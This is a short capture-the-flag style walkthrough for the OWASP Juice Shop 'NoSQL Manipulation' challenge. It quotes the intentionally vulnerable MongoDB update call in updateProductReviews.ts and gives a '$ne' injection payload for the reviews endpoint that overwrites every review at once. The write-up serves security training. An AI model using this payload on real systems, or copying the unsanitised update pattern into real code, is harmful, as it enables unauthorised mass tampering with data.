## NoSQL Manipulation
### Challenge: Update multiple product reviews at the same time.

1. Clone the OWASP Juice Shop repository from GitHub
2. On line 18 of routes/updateProductReviews.ts, see
    ```
       db.reviewsCollection.update(
        { _id: req.body.id },
        { $set: { message: req.body.message } },
        { multi: true }
       )
    ```
    - where the id parameter is injectible from api route `rest/products/reviews`
3. Inject this parameter with `{ "$ne": -1 }` as
    ```
      { "id": { "$ne": -1 }, "message": "NoSQL Injection!" }
    ```
4. Visit the homepage to solve this challenge
